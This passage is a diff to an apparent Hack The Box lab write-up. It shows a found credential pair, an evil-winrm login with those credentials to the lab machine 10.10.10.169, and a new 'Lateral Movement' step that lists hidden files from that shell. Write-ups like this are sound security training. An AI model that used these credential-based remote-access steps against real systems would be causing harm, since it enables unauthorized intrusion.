@@ -183,3 +183,10 @@ Credentials- melanie:Welcome123!
 ▶ evil-winrm -i 10.10.10.169 -P 5985 -u melanie -p 'Welcome123!'
 ```
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/e36af976-1ab7-4e1d-80f3-4512e6388fd6)
+
+# Lateral Movement
+```CSS
+*Evil-WinRM* PS C:\Users\melanie\Documents> cd C:\
+*Evil-WinRM* PS C:\> dir -force
+```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/5685fdb2-0738-4a96-93c2-5e87c98c70d9)
